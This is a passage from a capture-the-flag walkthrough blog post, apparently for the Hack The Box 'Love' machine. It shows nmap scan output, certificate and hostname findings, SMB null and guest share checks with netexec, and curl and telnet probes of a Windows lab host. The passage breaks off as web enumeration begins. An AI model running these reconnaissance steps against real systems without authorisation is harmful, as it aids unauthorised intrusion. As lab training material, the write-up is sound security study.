ime=6768FE45%25P=x86_64-pc-linux-gnu%25%0a%20%20SF:r%28RPCCheck,4A,%22F%5c0%5c0%5cx01%5cxffj%5cx04Host%5cx20%2710%5c.10%5c.14%5c.80%27%5cx20is%5cx20not%5c%0a%20%20SF:x20allowed%5cx20to%5cx20connect%5cx20to%5cx20this%5cx20MariaDB%5cx20server%22%29%25r%28SSLS%0a%20%20SF:essionReq,4A,%22F%5c0%5c0%5cx01%5cxffj%5cx04Host%5cx20%2710%5c.10%5c.14%5c.80%27%5cx20is%5cx20not%5cx%0a%20%20SF:20allowed%5cx20to%5cx20connect%5cx20to%5cx20this%5cx20MariaDB%5cx20server%22%29%25r%28Termi%0a%20%20SF:nalServerCookie,4A,%22F%5c0%5c0%5cx01%5cxffj%5cx04Host%5cx20%2710%5c.10%5c.14%5c.80%27%5cx20is%5cx2%0a%20%20SF:0not%5cx20allowed%5cx20to%5cx20connect%5cx20to%5cx20this%5cx20MariaDB%5cx20server%22%29%25r%0a%20%20SF:%28Kerberos,4A,%22F%5c0%5c0%5cx01%5cxffj%5cx04Host%5cx20%2710%5c.10%5c.14%5c.80%27%5cx20is%5cx20not%5cx%0a%20%20SF:20allowed%5cx20to%5cx20connect%5cx20to%5cx20this%5cx20MariaDB%5cx20server%22%29%25r%28X11Pr%0a%20%20SF:obe,4A,%22F%5c0%5c0%5cx01%5cxffj%5cx04Host%5cx20%2710%5c.10%5c.14%5c.80%27%5cx20is%5cx20not%5cx20allo%0a%20%20SF:wed%5cx20to%5cx20connect%5cx20to%5cx20this%5cx20MariaDB%5cx20server%22%29%25r%28LANDesk-RC,%0a%20%20SF:4A,%22F%5c0%5c0%5cx01%5cxffj%5cx04Host%5cx20%2710%5c.10%5c.14%5c.80%27%5cx20is%5cx20not%5cx20allowed%5c%0a%20%20SF:x20to%5cx20connect%5cx20to%5cx20this%5cx20MariaDB%5cx20server%22%29%25r%28TerminalServer,%0a%20%20SF:4A,%22F%5c0%5c0%5cx01%5cxffj%5cx04Host%5cx20%2710%5c.10%5c.14%5c.80%27%5cx20is%5cx20not%5cx20allowed%5c%0a%20%20SF:x20to%5cx20connect%5cx20to%5cx20this%5cx20MariaDB%5cx20server%22%29%25r%28NotesRPC,4A,%22F%5c%0a%20%20SF:0%5c0%5cx01%5cxffj%5cx04Host%5cx20%2710%5c.10%5c.14%5c.80%27%5cx20is%5cx20not%5cx20allowed%5cx20to%5c%0a%20%20SF:x20connect%5cx20to%5cx20this%5cx20MariaDB%5cx20server%22%29%25r%28JavaRMI,4A,%22F%5c0%5c0%5cx01%0a%20%20SF:%5cxffj%5cx04Host%5cx20%2710%5c.10%5c.14%5c.80%27%5cx20is%5cx20not%5cx20allowed%5cx20to%5cx20conn%0a%20%20SF:ect%5cx20to%5cx20this%5cx20MariaDB%5cx20server%22%29%25r%28ms-sql-s,4A,%22F%5c0%5c0%5cx01%5cxffj%5c%0a%20%20SF:x04Host%5cx20%2710%5c.10%5c.14%5c.80%27%5cx20is%5cx20not%5cx20allowed%5cx20to%5cx20connect%5cx2%0a%20%20SF:0to%5cx20this%5cx20MariaDB%5cx20server%22%29;%0a%20%20No%20exact%20OS%20matches%20for%20host%20%28If%20you%20know%20what%20OS%20is%20running%20on%20it,%20see%20https://nmap.org/submit/%20%29.%0a%20%20TCP/IP%20fingerprint:%0a%20%20OS:SCAN%28V=7.94SVN%25E=4%25D=12/23%25OT=80%25CT=1%25CU=32188%25PV=Y%25DS=2%DC=I%25G=Y%25TM=676%0a%20%20OS:8FEFA%25P=x86_64-pc-linux-gnu%29SEQ%28SP=104%25GCD=1%25ISR=10B%25TI=I%25CI=I%25II=I%25SS=S%0a%20%20OS:%25TS=U%29OPS%28O1=M53CNW8NNS%25O2=M53CNW8NNS%25O3=M53CNW8%25O4=M53CNW8NNS%25O5=M53CNW%0a%20%20OS:8NNS%25O6=M53CNNS%29WIN%28W1=FFFF%25W2=FFFF%25W3=FFFF%25W4=FFFF%25W5=FFFF%25W6=FF70%29ECN%28%0a%20%20OS:R=Y%DF=Y%25T=80%25W=FFFF%25O=M53CNW8NNS%CC=N%25Q=%29T1%28R=Y%DF=Y%25T=80%25S=O%25A=S&#43;%25F=AS%0a%20%20OS:%25RD=0%25Q=%29T2%28R=N%29T3%28R=N%29T4%28R=Y%DF=Y%25T=80%25W=0%25S=A%25A=O%25F=R%25O=%25RD=0%25Q=%29T5%28R=%0a%20%20OS:Y%DF=Y%25T=80%25W=0%25S=Z%25A=S&#43;%25F=AR%25O=%25RD=0%25Q=%29T6%28R=Y%DF=Y%25T=80%25W=0%25S=A%25A=O%25F=%0a%20%20OS:R%25O=%25RD=0%25Q=%29T7%28R=N%29U1%28R=Y%DF=N%25T=80%25IPL=164%25UN=0%25RIPL=G%25RID=G%25RIPCK=G%25R%0a%20%20OS:UCK=G%25RUD=G%29IE%28R=Y%DFI=N%25T=80%CD=Z%29%0a%0a%20%20Network%20Distance:%202%20hops%0a%20%20Service%20Info:%20Hosts:%20www.example.com,%20LOVE,%20www.love.htb;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0a%20%20Host%20script%20results:%0a%20%20%7c%20smb2-security-mode:%0a%20%20%7c%20%20%203:1:1:%0a%20%20%7c_%20%20%20%20Message%20signing%20enabled%20but%20not%20required%0a%20%20%7c%20smb2-time:%0a%20%20%7c%20%20%20date:%202024-12-23T07:32:18%0a%20%20%7c_%20%20start_date:%20N/A%0a%20%20%7c%20smb-os-discovery:%0a%20%20%7c%20%20%20OS:%20Windows%2010%20Pro%2019042%20%28Windows%2010%20Pro%206.3%29%0a%20%20%7c%20%20%20OS%20CPE:%20cpe:/o:microsoft:windows_10::-%0a%20%20%7c%20%20%20Computer%20name:%20Love%0a%20%20%7c%20%20%20NetBIOS%20computer%20name:%20LOVE%5cx00%0a%20%20%7c%20%20%20Workgroup:%20WORKGROUP%5cx00%0a%20%20%7c_%20%20System%20time:%202024-12-22T23:32:20-08:00%0a%20%20%7c_clock-skew:%20mean:%203h21m34s,%20deviation:%204h00m02s,%20median:%201h21m33s%0a%20%20%7c%20smb-security-mode:%0a%20%20%7c%20%20%20account_used:%20guest%0a%20%20%7c%20%20%20authentication_level:%20user%0a%20%20%7c%20%20%20challenge_response:%20supported%0a%20%20%7c_%20%20message_signing:%20disabled%20%28dangerous,%20but%20default%29%0a%0a%20%20OS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20252.50%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  ali in HTB/BlogEntriesMade/Love/scans/nmap  🍣 main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>  🕙 06:05:37 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-23 06:06 GMT
+</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.48.103
+</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">65516</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  PORT      STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>  80/tcp    open  http         Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span style="display:flex;"><span>  |_http-title: Voting System using PHP
+</span></span><span style="display:flex;"><span>  | http-cookie-flags:
+</span></span><span style="display:flex;"><span>  |   /:
+</span></span><span style="display:flex;"><span>  |     PHPSESSID:
+</span></span><span style="display:flex;"><span>  |_      httponly flag not set
+</span></span><span style="display:flex;"><span>  135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>  443/tcp   open  ssl/http     Apache httpd 2.4.46 <span style="color:#f92672">(</span>OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>  |_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span style="display:flex;"><span>  | tls-alpn:
+</span></span><span style="display:flex;"><span>  |_  http/1.1
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>staging.love.htb/organizationName<span style="color:#f92672">=</span>ValentineCorp/stateOrProvinceName<span style="color:#f92672">=</span>m/countryName<span style="color:#f92672">=</span>in
+</span></span><span style="display:flex;"><span>  | Not valid before: 2021-01-18T14:00:16
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2022-01-18T14:00:16
+</span></span><span style="display:flex;"><span>  |_http-title: <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>  445/tcp   open  microsoft-ds Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  3306/tcp  open  mysql?
+</span></span><span style="display:flex;"><span>  | fingerprint-strings:
+</span></span><span style="display:flex;"><span>  |   JavaRMI, Kerberos, LANDesk-RC, NotesRPC, RPCCheck, SSLSessionReq, TerminalServer, TerminalServerCookie, X11Probe, ms-sql-s:
+</span></span><span style="display:flex;"><span>  |_    Host <span style="color:#e6db74">&#39;10.10.14.80&#39;</span> is not allowed to connect to this MariaDB server
+</span></span><span style="display:flex;"><span>  5000/tcp  open  http         Apache httpd 2.4.46 <span style="color:#f92672">(</span>OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_http-title: <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>  |_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span style="display:flex;"><span>  5040/tcp  open  unknown
+</span></span><span style="display:flex;"><span>  5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_http-title: Not Found
+</span></span><span style="display:flex;"><span>  |_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>  5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_http-title: Not Found
+</span></span><span style="display:flex;"><span>  |_ssl-date: 2024-12-23T07:32:38+00:00; +1h21m34s from scanner time.
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>LOVE
+</span></span><span style="display:flex;"><span>  | Subject Alternative Name: DNS:LOVE, DNS:Love
+</span></span><span style="display:flex;"><span>  | Not valid before: 2021-04-11T14:39:19
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2024-04-10T14:39:19
+</span></span><span style="display:flex;"><span>  | tls-alpn:
+</span></span><span style="display:flex;"><span>  |_  http/1.1
+</span></span><span style="display:flex;"><span>  |_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>  7680/tcp  open  pando-pub?
+</span></span><span style="display:flex;"><span>  47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>  |_http-title: Not Found
+</span></span><span style="display:flex;"><span>  49664/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  49665/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  49666/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  49667/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  49668/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  49669/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  49670/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>  SF-Port3306-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>12/23%Time<span style="color:#f92672">=</span>6768FE45%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%
+</span></span><span style="display:flex;"><span>  SF:r<span style="color:#f92672">(</span>RPCCheck,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.80&#39;\x20is\x20not\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLS
+</span></span><span style="display:flex;"><span>  SF:essionReq,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.80&#39;\x20is\x20not\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Termi
+</span></span><span style="display:flex;"><span>  SF:nalServerCookie,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.80&#39;\x20is\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:0not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r
+</span></span><span style="display:flex;"><span>  SF:<span style="color:#f92672">(</span>Kerberos,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.80&#39;\x20is\x20not\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>X11Pr
+</span></span><span style="display:flex;"><span>  SF:obe,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.80&#39;\x20is\x20not\x20allo
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LANDesk-RC,
+</span></span><span style="display:flex;"><span>  SF:4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.80&#39;\x20is\x20not\x20allowed\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServer,
+</span></span><span style="display:flex;"><span>  SF:4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.80&#39;\x20is\x20not\x20allowed\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NotesRPC,4A,<span style="color:#e6db74">&#34;F\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.80&#39;\x20is\x20not\x20allowed\x20to\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>JavaRMI,4A,<span style="color:#e6db74">&#34;F\0\0\x01
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:\xffj\x04Host\x20&#39;10\.10\.14\.80&#39;\x20is\x20not\x20allowed\x20to\x20conn
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:ect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>ms-sql-s,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x04Host\x20&#39;10\.10\.14\.80&#39;\x20is\x20not\x20allowed\x20to\x20connect\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:0to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>  No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  TCP/IP fingerprint:
+</span></span><span style="display:flex;"><span>  OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.94SVN%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>12/23%OT<span style="color:#f92672">=</span>80%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>32188%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>I%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span><span style="color:#ae81ff">676</span>
+</span></span><span style="display:flex;"><span>  OS:8FEFA%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>104%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10B%TI<span style="color:#f92672">=</span>I%CI<span style="color:#f92672">=</span>I%II<span style="color:#f92672">=</span>I%SS<span style="color:#f92672">=</span>S
+</span></span><span style="display:flex;"><span>  OS:%TS<span style="color:#f92672">=</span>U<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M53CNW8NNS%O2<span style="color:#f92672">=</span>M53CNW8NNS%O3<span style="color:#f92672">=</span>M53CNW8%O4<span style="color:#f92672">=</span>M53CNW8NNS%O5<span style="color:#f92672">=</span>M53CNW
+</span></span><span style="display:flex;"><span>  OS:8NNS%O6<span style="color:#f92672">=</span>M53CNNS<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FFFF%W2<span style="color:#f92672">=</span>FFFF%W3<span style="color:#f92672">=</span>FFFF%W4<span style="color:#f92672">=</span>FFFF%W5<span style="color:#f92672">=</span>FFFF%W6<span style="color:#f92672">=</span>FF70<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>  OS:R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>FFFF%O<span style="color:#f92672">=</span>M53CNW8NNS%CC<span style="color:#f92672">=</span>N%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS
+</span></span><span style="display:flex;"><span>  OS:%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  OS:Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  OS:R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>80%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%R
+</span></span><span style="display:flex;"><span>  OS:UCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>80%CD<span style="color:#f92672">=</span>Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>  Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Host script results:
+</span></span><span style="display:flex;"><span>  | smb2-security-mode:
+</span></span><span style="display:flex;"><span>  |   3:1:1:
+</span></span><span style="display:flex;"><span>  |_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>  | smb2-time:
+</span></span><span style="display:flex;"><span>  |   date: 2024-12-23T07:32:18
+</span></span><span style="display:flex;"><span>  |_  start_date: N/A
+</span></span><span style="display:flex;"><span>  | smb-os-discovery:
+</span></span><span style="display:flex;"><span>  |   OS: Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">10</span> Pro 6.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |   OS CPE: cpe:/o:microsoft:windows_10::-
+</span></span><span style="display:flex;"><span>  |   Computer name: Love
+</span></span><span style="display:flex;"><span>  |   NetBIOS computer name: LOVE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>  |   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>  |_  System time: 2024-12-22T23:32:20-08:00
+</span></span><span style="display:flex;"><span>  |_clock-skew: mean: 3h21m34s, deviation: 4h00m02s, median: 1h21m33s
+</span></span><span style="display:flex;"><span>  | smb-security-mode:
+</span></span><span style="display:flex;"><span>  |   account_used: guest
+</span></span><span style="display:flex;"><span>  |   authentication_level: user
+</span></span><span style="display:flex;"><span>  |   challenge_response: supported
+</span></span><span style="display:flex;"><span>  |_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 252.50 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Findings</strong>:
+<ul>
+<li>Looking at the certificate there is a DNS entry for <code>staging.love.htb</code> &amp; the organization name <code>ValentineCorp</code>.
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>staging.love.htb/organizationName<span style="color:#f92672">=</span>ValentineCorp/stateOrProvinceName<span style="color:#f92672">=</span>m/countryName<span style="color:#f92672">=</span>in</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>I can see that the computer name is <code>love</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> |   Computer name: Love</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Further services are running</strong>:
+<ul>
+<li>HTTP:
+<ul>
+<li>5040</li>
+</ul>
+</li>
+<li>pando-pub
+<ul>
+<li>7680</li>
+</ul>
+</li>
+<li>RPC:
+<ul>
+<li>47001</li>
+<li>49664</li>
+<li>49665</li>
+<li>49666</li>
+<li>49667</li>
+<li>49668</li>
+<li>49669</li>
+<li>49670</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="updating-etc-hosts-and-variables">Updating ETC/HOSTS &amp; Variables:</h4>
+<ul>
+<li>
+<p><strong>Updated Domain &amp; Machine Variables for Testing</strong>:</p>
+<ul>
+<li>Now that I have this information, I can update the <code>domain</code> and <code>machine</code> variables used in tests:
+<ul>
+<li><code>update_var domain &quot;love.htb&quot;</code></li>
+<li><code>update_var machine &quot;love&quot;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Updating</strong> <code>/etc/hosts</code> <strong>for DNS and LDAP Queries</strong>:</p>
+<ul>
+<li>I update my <code>/etc/hosts</code> file.
+<ul>
+<li><code>echo &quot;$box   $domain staging.$domain&quot; | sudo tee -a /etc/hosts</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="smb-445">SMB <code>445</code>:</h3>
+<h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
+<ul>
+<li><strong>This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold</strong>:
+<ul>
+<li><code>netexec smb $box -u 'guest' -p '' --shares</code></li>
+<li><code>netexec smb $box -u '' -p '' --shares</code></li>
+<li><figure><img src="/ox-hugo/2024-12-23-060849_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="service-5000">Service <code>5000</code>:</h3>
+<ul>
+<li>I try and access the service on this port via telnet and the browser but it&rsquo;s forbidden.
+<ul>
+<li><code>telnet $box 5000</code></li>
+<li><code>curl http://$box:5000 -v -L</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-145218_.png">
+</figure>
+</li>
+<li>Forbidden.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="service-7680">Service <code>7680</code>:</h3>
+<ul>
+<li>I get no response from this service via telnet or curl.
+<ul>
+<li><code>telnet $box 7680</code></li>
+<li><code>curl http://$box:7680 -v -L</code></li>
+<li><figure><img src="/ox-hugo/2024-12-23-145437_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="web-80-443">Web <code>80/443</code>:</h3>
+<ul>
+<li><strong>Web Enumeration via Burp Suite</strong>:
+<ul>
+<li>When enumerating a website, always use Burp Suite. This allows you to:
+<ul>
+<li>Record all potential injection points.</li>
